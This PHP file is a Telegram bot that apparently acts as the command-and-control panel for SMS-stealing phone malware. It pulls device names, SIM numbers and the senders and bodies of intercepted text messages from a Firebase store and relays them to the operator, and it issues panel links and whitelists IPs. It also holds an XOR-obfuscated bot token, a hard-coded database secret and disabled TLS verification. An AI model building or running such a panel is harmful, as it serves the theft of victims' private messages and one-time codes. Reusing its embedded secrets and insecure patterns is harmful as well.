<?php
// ─── Alexa Admin Telegram Bot ───────────────────────────────────────────────
// Bot Token (encrypted)
$enc_token = base64_decode('eVtRQFB4UVlYXAhxc3xRJkQLAgFMIhtUA1AnUHECDXAFSQ4rCi4JeAYUIVpXCA==');
$key = 'AlexaAdmin2024!@#';
$token = '';
for ($i = 0; $i < strlen($enc_token); $i++) {
    $token .= chr(ord($enc_token[$i]) ^ ord($key[$i % strlen($key)]));
}

// Firebase config
$firebase_url = 'https://alexa-a6ad8-default-rtdb.firebaseio.com';
$firebase_secret = 'hGmBC6jQAUvLixgM8AlngEBF6dN1rsmf6QBRK2ZM';

define('BOT_TOKEN', $token);
define('FB_URL', $firebase_url);
define('FB_SECRET', $firebase_secret);

function fb_put($path, $data) {
    $url = rtrim(FB_URL, '/') . '/' . ltrim($path, '/') . '.json?auth=' . urlencode(FB_SECRET);
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => 10,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_CUSTOMREQUEST => 'PUT',
        CURLOPT_POSTFIELDS => json_encode($data),
        CURLOPT_HTTPHEADER => ['Content-Type: application/json']
    ]);
    $res = curl_exec($ch);
    curl_close($ch);
    return $res;
}

function fb_get($path) {
    $url = rtrim(FB_URL, '/') . '/' . ltrim($path, '/') . '.json?auth=' . urlencode(FB_SECRET);
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => 10,
        CURLOPT_SSL_VERIFYPEER => false
    ]);
    $res = curl_exec($ch);
    curl_close($ch);
    return json_decode($res, true);
}

function bot_send($chat_id, $text, $parse = 'HTML') {
    $url = 'https://api.telegram.org/bot' . BOT_TOKEN . '/sendMessage';
    $data = ['chat_id' => $chat_id, 'text' => $text, 'parse_mode' => $parse];
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => $url,
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => $data,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => 10,
        CURLOPT_SSL_VERIFYPEER => false
    ]);
    $res = curl_exec($ch);
    curl_close($ch);
    return json_decode($res, true);
}

function bot_send_keyboard($chat_id, $text, $keyboard, $parse = 'HTML') {
    $url = 'https://api.telegram.org/bot' . BOT_TOKEN . '/sendMessage';
    $data = [
        'chat_id' => $chat_id,
        'text' => $text,
        'parse_mode' => $parse,
        'reply_markup' => json_encode(['inline_keyboard' => $keyboard])
    ];
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => $url,
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => $data,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => 10,
        CURLOPT_SSL_VERIFYPEER => false
    ]);
    $res = curl_exec($ch);
    curl_close($ch);
    return json_decode($res, true);
}

function get_owner() {
    $data = fb_get('/panel/owner');
    return $data ? $data['chat_id'] ?? null : null;
}

function is_whitelisted($chat_id) {
    $ips = fb_get('/panel/whitelist');
    return $ips && in_array($chat_id, (array)$ips);
}

function register_device_token($chat_id) {
    $token = bin2hex(random_bytes(16));
    fb_put("/panel/auth_tokens/$token", [
        'chat_id' => $chat_id,
        'created' => time(),
        'expires' => time() + 86400
    ]);
    return $token;
}

function get_visitors() {
    // Count registered devices that have sent SMS recently
    $sms = fb_get('/sms');
    if (!$sms) return 0;
    $unique = [];
    $today = date('Y-m-d');
    foreach ($sms as $s) {
        if (!is_array($s)) continue;
        $dt = $s['date'] ?? $s['timestamp'] ?? '';
        $is_today = strpos($dt, $today) !== false || (is_numeric($dt) && date('Y-m-d', $dt/1000) === $today);
        if ($is_today && !empty($s['deviceId'])) {
            $unique[$s['deviceId']] = true;
        }
    }
    return count($unique);
}

// ─── Webhook Handler ─────────────────────────────────────────────────────────
if (isset($_GET['setup'])) {
    $webhook_url = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http') . '://' . $_SERVER['HTTP_HOST'] . $_SERVER['SCRIPT_NAME'];
    // Force HTTPS
    $webhook_url = str_replace('http://', 'https://', $webhook_url);
    
    $url = 'https://api.telegram.org/bot' . BOT_TOKEN . '/setWebhook?url=' . urlencode($webhook_url);
    $res = file_get_contents($url);
    echo "<pre>Setup Result:\n" . print_r(json_decode($res, true), true) . "\n\n";
    echo "Webhook URL: $webhook_url</pre>";
    exit;
}

if (isset($_GET['info'])) {
    $url = 'https://api.telegram.org/bot' . BOT_TOKEN . '/getWebhookInfo';
    echo file_get_contents($url);
    exit;
}

// ─── Handle Incoming Updates ─────────────────────────────────────────────────
$input = json_decode(file_get_contents('php://input'), true);
if (!$input) exit;

$msg = $input['message'] ?? [];
$cb = $input['callback_query'] ?? [];
$chat_id = $msg['chat']['id'] ?? $cb['message']['chat']['id'] ?? 0;
$text = trim($msg['text'] ?? '');
$from_id = $msg['from']['id'] ?? $cb['from']['id'] ?? 0;

// Auto-register first sender as owner
$owner = get_owner();
if (!$owner) {
    fb_put('/panel/owner', ['chat_id' => $from_id, 'username' => $msg['from']['username'] ?? '', 'registered' => time()]);
    fb_put("/panel/whitelist/$from_id", $from_id);
    $owner = $from_id;
}

// Handle callback queries
if ($cb) {
    $data = $cb['data'] ?? '';
    $chat_id = $cb['message']['chat']['id'];
    $msg_id = $cb['message']['message_id'];
    
    if ($data === 'devices') {
        $devices = fb_get('/clients') ?? fb_get('/devices') ?? [];
        if (!$devices) {
            bot_send($chat_id, '❌ No devices found.');
        } else {
            $count = count($devices);
            $online = 0;
            $text = "📱 <b>Devices:</b> $count\n\n";
            foreach ($devices as $id => $d) {
                if (!is_array($d)) continue;
                $on = !empty($d['online']) || !empty($d['isOnline']);
                if ($on) $online++;
                $name = $d['deviceName'] ?? $d['name'] ?? $id;
                $num = $d['simNumber'] ?? $d['number'] ?? '-';
                $text .= ($on ? '🟢' : '🔴') . " <b>$name</b>\n📞 $num\n🆔 <code>$id</code>\n\n";
            }
            $text = "📱 <b>Devices:</b> $count | 🟢 $online online | 🔴 " . ($count - $online) . " offline\n\n" . $text;
            bot_send($chat_id, $text);
        }
    }
    elseif ($data === 'sms') {
        $sms = fb_get('/sms') ?? fb_get('/messages') ?? [];
        if (!$sms) {
            bot_send($chat_id, '❌ No SMS found.');
        } else {
            $recent = array_slice($sms, -10);
            $text = "📩 <b>Recent SMS:</b>\n\n";
            foreach ($recent as $id => $s) {
                if (!is_array($s)) continue;
                $body = $s['body'] ?? $s['message'] ?? '';
                $addr = $s['address'] ?? $s['sender'] ?? 'Unknown';
                $text .= "👤 <b>$addr</b>\n💬 " . mb_substr($body, 0, 100) . "\n\n";
            }
            bot_send($chat_id, $text);
        }
    }
    elseif ($data === 'ping') {
        $devices = fb_get('/clients') ?? fb_get('/devices') ?? [];
        $sms = fb_get('/sms') ?? fb_get('/messages') ?? [];
        $text = "📊 <b>Server Status</b>\n\n";
        $text .= "📱 Devices: " . ($devices ? count($devices) : 0) . "\n";
        $text .= "💬 SMS: " . ($sms ? count($sms) : 0) . "\n";
        $text .= "🕐 Time: " . date('Y-m-d H:i:s') . "\n";
        bot_send($chat_id, $text);
    }
    elseif ($data === 'panel') {
        $token = register_device_token($from_id);
        $panel_url = "https://alexaadmin.onrender.com/panel.php?token=$token";
        bot_send($chat_id, "🔗 <b>Panel Link:</b>\n$panel_url\n\n⏰ Expires in 24 hours");
    }
    exit;
}

// ─── Commands ────────────────────────────────────────────────────────────────
if ($text === '/start') {
    $un = $msg['from']['username'] ?? 'NoUsername';
    bot_send_keyboard($chat_id, "🔥 <b>Alexa Admin Bot</b>\n\nWelcome, @$un!\nControl your panel from here.", [
        [['text' => '📱 Devices', 'callback_data' => 'devices']],
        [['text' => '📩 SMS', 'callback_data' => 'sms']],
        [['text' => '📊 Ping', 'callback_data' => 'ping']],
        [['text' => '🔗 Panel Link', 'callback_data' => 'panel']]
    ]);
}

elseif ($text === '/devices') {
    $devices = fb_get('/clients') ?? fb_get('/devices') ?? [];
    if (!$devices) {
        bot_send($chat_id, '❌ No devices found.');
    } else {
        $online = 0;
        $out = "📱 <b>All Devices:</b>\n\n";
        foreach ($devices as $id => $d) {
            if (!is_array($d)) continue;
            $on = !empty($d['online']) || !empty($d['isOnline']);
            if ($on) $online++;
            $name = $d['deviceName'] ?? $d['name'] ?? $id;
            $num = $d['simNumber'] ?? $d['number'] ?? '-';
            $out .= ($on ? '🟢' : '🔴') . " <b>$name</b>\n📞 <code>$num</code>\n\n";
        }
        $total = count($devices);
        bot_send($chat_id, "📱 <b>Devices:</b> $total | 🟢 $online | 🔴 " . ($total - $online) . "\n\n$out");
    }
}

elseif ($text === '/sms') {
    $sms = fb_get('/sms') ?? fb_get('/messages') ?? [];
    if (!$sms) {
        bot_send($chat_id, '❌ No SMS found.');
    } else {
        $recent = array_slice($sms, -15);
        $out = "📩 <b>Recent SMS:</b>\n\n";
        foreach ($recent as $id => $s) {
            if (!is_array($s)) continue;
            $body = $s['body'] ?? $s['message'] ?? '';
            $addr = $s['address'] ?? $s['sender'] ?? 'Unknown';
            $out .= "👤 <b>$addr</b>\n💬 " . mb_substr($body, 0, 120) . "\n\n";
        }
        bot_send($chat_id, $out);
    }
}

elseif ($text === '/ping') {
    $devices = fb_get('/clients') ?? fb_get('/devices') ?? [];
    $sms = fb_get('/sms') ?? fb_get('/messages') ?? [];
    $visitors = get_visitors();
    $dc = $devices ? count($devices) : 0;
    $sc = $sms ? count($sms) : 0;
    bot_send($chat_id, "📊 <b>Alexa Admin Status</b>\n\n📱 Devices: $dc\n💬 SMS: $sc\n👤 Active Today: $visitors\n🕐 " . date('Y-m-d H:i:s'));
}

elseif ($text === '/visitors') {
    $visitors = get_visitors();
    bot_send($chat_id, "👤 <b>Active Devices Today:</b> $visitors");
}

elseif ($text === '/panel' || $text === '/link') {
    $token = register_device_token($from_id);
    $panel_url = "https://alexaadmin.onrender.com/panel.php?token=$token";
    bot_send($chat_id, "🔗 <b>Panel Access Link:</b>\n$panel_url\n\n⏰ Expires: 24 hours\n<i>Save this link!</i>");
}

elseif (strpos($text, '/addip') === 0) {
    $parts = explode(' ', $text);
    $ip = $parts[1] ?? '';
    if (!$ip || !filter_var($ip, FILTER_VALIDATE_IP)) {
        bot_send($chat_id, '❌ Usage: /addip <IP_ADDRESS>');
    } else {
        fb_put("/panel/whitelist/$ip", $ip);
        bot_send($chat_id, "✅ IP <code>$ip</code> whitelisted!");
    }
}

elseif (strpos($text, '/removeip') === 0) {
    $parts = explode(' ', $text);
    $ip = $parts[1] ?? '';
    if (!$ip) {
        bot_send($chat_id, '❌ Usage: /removeip <IP_ADDRESS>');
    } else {
        fb_put("/panel/whitelist/$ip", null);
        bot_send($chat_id, "✅ IP <code>$ip</code> removed!");
    }
}

elseif ($text === '/listips') {
    $ips = fb_get('/panel/whitelist');
    if (!$ips) {
        bot_send($chat_id, '❌ No whitelisted IPs.');
    } else {
        $out = "📋 <b>Whitelisted IPs:</b>\n\n";
        foreach ((array)$ips as $ip => $v) {
            if ($ip !== 'owner') $out .= "• <code>$ip</code>\n";
        }
        bot_send($chat_id, $out);
    }
}

elseif ($text === '/register') {
    $code = strtoupper(bin2hex(random_bytes(4)));
    fb_put("/panel/register_codes/$code", [
        'chat_id' => $from_id,
        'created' => time(),
        'expires' => time() + 300
    ]);
    $link = "https://alexaadmin.onrender.com/panel.php?register=$code";
    bot_send($chat_id, "🔗 <b>Registration Link:</b>\n$link\n\n⏰ Expires in 5 minutes");
}

elseif ($text === '/help') {
    bot_send($chat_id, "🔰 <b>Alexa Admin Bot Commands</b>\n\n"
        . "/start - Main menu\n"
        . "/devices - List all devices\n"
        . "/sms - Recent SMS\n"
        . "/ping - Server status\n"
        . "/visitors - Active devices today\n"
        . "/panel - Get panel access link\n"
        . "/register - One-time registration\n"
        . "/addip &lt;ip&gt; - Whitelist IP\n"
        . "/removeip &lt;ip&gt; - Remove IP\n"
        . "/listips - List whitelisted IPs\n"
        . "/help - This message");
}

else {
    bot_send($chat_id, "❓ Unknown command. Use /help");
}
